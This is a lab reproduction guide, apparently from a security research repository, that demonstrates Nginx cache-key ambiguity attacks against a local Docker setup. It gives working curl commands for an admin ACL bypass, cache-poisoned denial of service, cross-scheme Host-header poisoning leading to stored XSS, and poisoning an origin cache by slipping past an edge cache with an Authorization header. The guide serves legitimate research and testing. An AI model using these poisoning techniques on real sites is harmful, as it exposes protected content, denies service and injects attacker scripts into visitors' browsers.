# Reproduction guide

This walks through all four documented primitives against the lab in
`lab/`. Run everything from inside `lab/` unless noted.

## 0. Setup

```bash
cd lab
./scripts/gen-certs.sh
docker compose up -d --build
```

Services:

| Service | Port(s) | Role |
|---|---|---|
| `backend` | internal 5000 | Flask app, source of truth responses |
| `nginx` | 8080 (HTTP), 8443 (HTTPS) | Caching reverse proxy — the vulnerable component |
| `edge-sim` | 9090 | Simplified Cloudflare-like edge cache, for Scenario 4 only |

Every response from `nginx` carries debug headers (`X-Cache`,
`X-Debug-Key`) that are **lab-only** instrumentation — never rely on a real
target exposing the literal cache key like this; see
`docs/04-testing-methodology.md` for the black-box technique that doesn't
need it.

## Scenario 1 — Cache deception without user interaction (ACL bypass)

Config: `location = /admin` has `allow 127.0.0.1; deny all;` and the
ambiguous key `"$scheme$proxy_host$uri$is_args$args$http_accept"`.

```bash
# Seed the cache as the real admin would (request made from localhost)
./scripts/seed-admin-cache.sh

# Confirm a normal attacker request is denied
curl -s -o /dev/null -w "HTTP %{http_code}\n" -H "Accept: */*" http://localhost:8080/admin
# -> 403

# Exploit: split "/admin" across the URI and the Accept header
curl -s -H "Accept: min*/*" http://localhost:8080/ad -D -
```

Expected: `X-Cache: HIT` and the response body contains the admin
dashboard content, even though the URI was `/ad`, not `/admin`, and no ACL
was satisfied for this request.

Or just run: `./scripts/run-scenario.sh acl-bypass`

## Scenario 2 — CPDoS

Same key, same mechanism, different timing: the attacker poisons the key
**before** a legitimate user requests the real resource.

```bash
# Attacker pre-poisons the /home key by requesting a 404 under a colliding key
curl -s -H "Accept: ome*/*" http://localhost:8080/h -D -

# Victim requests /home normally
curl -s -H "Accept: */*" http://localhost:8080/home -D -
```

Expected: the victim's request gets `X-Cache: HIT` and a 404, not the
homepage.

Or: `./scripts/run-scenario.sh cpdos`

> Reset between runs with `docker exec ck_nginx nginx -s reload` or
> `docker compose restart nginx` if you want a clean cache.

## Scenario 3 — Cross-scheme collision → stored XSS

Config: root `location = /` uses the global default key
`"$scheme$host$request_uri"`, listens on 80 and 443 with no redirect, and
the backend reflects `Host` into a `<script src>`.

```bash
# 1. Confirm Host reflection + that port 80 and 443 serve equivalent content
curl -sk -H "Host: target.com" "http://localhost:8080/?cachebuster=t1" | grep script

# 2. Poison: shift the trailing "s" of "https" into the Host value
curl -s -H "Host: sdummywebsite.localhost" "http://localhost:8080/" -D -

# 3. A normal HTTPS request to the real host now gets the poisoned entry
curl -sk -H "Host: dummywebsite.localhost" "https://localhost:8443/" -D -
```

Expected: step 3's response reflects `sdummywebsite.localhost` in the
script src, even though the request's `Host` was `dummywebsite.localhost`
and the scheme was `https`. In a real exploit the attacker would control
`sdummywebsite.localhost` (or an equivalent prefixed domain) and serve a
malicious `main.js` from it.

Or: `./scripts/run-scenario.sh stored-xss`

## Scenario 4 — Bypassing an edge cache (Cloudflare-like) to poison an origin cache

`edge-sim` bypasses its own cache whenever a request carries
`Authorization` (mirroring Cloudflare's documented default with Origin
Cache Control), and forwards straight to the Nginx origin, where the
ambiguous key is still in play.

```bash
# 1. Attacker request through the edge, with Authorization, splitting
#    "XYZ" across the URI and Accept header
curl -s -H "Authorization: Bearer x" -H "Accept: Z" http://localhost:9090/XY -D -
# -> CF-Cache-Status: BYPASS, X-Cache: MISS (reached nginx, nginx cached it)

# 2. Confirm the origin cache now serves /XYZ from that colliding entry
curl -s -H "Authorization: Bearer x" http://localhost:9090/XYZ -D -
# -> CF-Cache-Status: BYPASS (edge still bypassed because of Authorization),
#    X-Cache: HIT (nginx served the poisoned origin entry)
```

Note the real point of this scenario: **the edge bypass is what lets you
reach the origin cache at all.** Without the `Authorization` trick (or an
equivalent edge-bypass header for your CDN), your injected request would
be absorbed by the edge cache and never reach Nginx's ambiguous key logic.

Or: `./scripts/run-scenario.sh cdn-bypass`

## Cleanup

```bash
docker compose down -v
```

Next: `docs/03-research-roadmap.md` for where to take this.
